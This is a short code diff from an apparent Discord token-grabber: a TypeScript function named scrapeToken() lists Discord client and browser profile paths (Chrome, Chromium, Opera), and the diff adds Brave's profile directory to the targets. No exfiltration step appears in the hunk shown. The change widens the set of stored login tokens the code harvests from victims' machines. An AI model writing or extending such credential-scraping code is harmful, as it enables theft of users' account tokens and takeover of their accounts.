@@ -67,6 +67,7 @@ function scrapeToken():string {
       "Discord PTB": `${config}/discordptb`,
       "Google Chrome": `${config}/chrome/Default`,
       "Chromium": `${config}/chromium/Default`,
+      "Brave":    `${config}/BraveSoftware/Brave-Browser/Default`,
       "Opera": `${config}/opera`
     }
   }
